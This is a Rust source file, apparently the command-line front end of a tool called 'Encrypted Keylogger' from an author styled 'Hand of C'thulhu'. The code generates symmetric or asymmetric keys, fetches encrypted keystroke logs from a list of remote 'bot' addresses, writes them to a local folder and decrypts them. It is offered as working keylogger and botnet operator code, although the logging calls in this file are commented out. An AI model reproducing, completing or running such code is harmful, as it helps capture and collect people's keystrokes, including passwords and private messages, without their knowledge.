#[macro_use]
extern crate clap;

extern crate keylogger_lib;
use keylogger_lib::*;

fn main() {
    let args = clap::App::new("Encrypted Keylogger")
        .version(crate_version!())
        .author("Hand of C'thulhu")
        .arg(clap::Arg::with_name("generate")
            .long("generate")
            .conflicts_with_all(&["decrypt", "retrieve", "bot_addr"])
            .takes_value(false))
        .arg(clap::Arg::with_name("decrypt")
            .short("D")
            .long("decrypt")
            .value_name("FILE")
            .help("Specify the decrypt file, and turn into decrypt mode")
            .takes_value(true)
            .min_values(0))
        .arg(clap::Arg::with_name("asymmetric")
            .short("A")
            .long("asym")
            .takes_value(false))
        .arg(clap::Arg::with_name("asymmetric_keys")
            .long("asym-keys")
            .min_values(2).takes_value(true)
            .value_names(&["PUB_KEY_FILE", "SEC_KEY_FILE"]))
        .arg(clap::Arg::with_name("retrieve")
            .short("R")
            .long("retrieve")
            .help("Retrieves data from remote location, pair with --decrypt to automatically print decrypted data")
            .takes_value(true)
            .value_name("DEST_FOLDER"))
        .arg(clap::Arg::with_name("bot_addr")
            .long("bot-addr")
            .requires("retrieve")
            .takes_value(true)
            .value_name("FILE"))
        .arg(clap::Arg::with_name("KEY")
            .help("Encryption Key")
//            .short("k")
//            .long("key")
//            .takes_value(true)
//            .value_name("FILE")
             )
        .get_matches();

    if args.is_present("generate") {
        if let Some(data) = args.values_of("asymmetric_keys") {
            let data: Vec<&str> = data.collect();
            if data.len() != 2 {
                panic!("Asymmetric flag missing second argument")
            }
            if let Err(err) = gen_key_pair(data[0], data[1]) {
                println!("{}", err.description());
            } else {
                println!("Public and private key generated");
            }
        } else {
            let key_path = args.value_of("KEY").unwrap();
            generate_key_and_nonce(key_path).expect("Key generation failed");
        }
        return;
    }

    if let Some(retrieve_path) = args.value_of("retrieve") {
        let retrieve_path = std::path::Path::new(retrieve_path);
        let bot_addr_list = parse_bot_list(args.value_of("bot_addr").unwrap_or("bot_addr.list")).unwrap_or_else(|err| {
            println!("Error with bot-address-list path: {}", err);
            std::process::exit(1);
        });

        //TODO: make retrieval streamified
        let encrypted_data_paths: Vec<Vec<std::path::PathBuf>> = bot_addr_list.iter().map(|bot_addr| {
            retrieve_remote_keylogs(bot_addr).iter().map(|&(ref name, ref data)| {
                use std::io::Write;
                let output_path = retrieve_path.join(format!("{}_{}", bot_addr.split(":").collect::<Vec<&str>>()[0], name));

                std::fs::OpenOptions::new()
                    .write(true)
                    .create(true)
                    .append(true)
                    .open(&output_path)
                    .expect("Open problems")
                    .write(data.as_ref())
                    .expect("Write problems");
                output_path
            }).collect::<Vec<std::path::PathBuf>>()
        }).collect();
        let encrypted_data_paths: Vec<&std::path::PathBuf> = encrypted_data_paths.iter().flat_map(|p| p).collect();
        println!("{:?}", encrypted_data_paths);

        if !args.is_present("decrypt") { return; }

        for path in encrypted_data_paths {
            if let Some(data) = args.values_of("asymmetric_keys") {
                let data: Vec<&str> = data.collect();
                if data.len() != 2 {
                    println!("Asymmetric flag missing second argument");
                    return;
                }
                decrypt_asym_sym(path.to_str().unwrap(), data[0], data[1], args.value_of("KEY").unwrap())
                    .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
            } else {
                decrypt_sym(path.to_str().unwrap(), args.value_of("KEY").unwrap())
                    .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
            }
        }

        return;
    }

    if let Some(decrypt_path) = args.value_of("decrypt") {
        if let Some(data) = args.values_of("asymmetric_keys") {
            let data: Vec<&str> = data.collect();
            if data.len() != 2 {
                println!("Asymmetric flag missing second argument");
                return;
            }

            decrypt_asym_sym(decrypt_path, data[0], data[1], args.value_of("KEY").unwrap())
                .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
        } else {
            decrypt_sym(decrypt_path, args.value_of("KEY").unwrap())
                .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
        }
    } else {
        let key_path = args.value_of("KEY").unwrap();
        if args.is_present("asymmetric") {
            if let Err(problem) = get_public_key(key_path) {
                println!("Error with key input: {}", problem.description());
            } else {
                //key_log(&EncryptionType::Asymmetric(args.value_of("KEY").unwrap().to_owned()));
            }
        } else {
            if let Err(problem) = generate_key_and_nonce(key_path) {
                println!("Error with key input: {}", problem.description());
            } else {
                //key_log(&EncryptionType::Symmetric(args.value_of("KEY").unwrap().to_owned()));
            }
        }
    }
}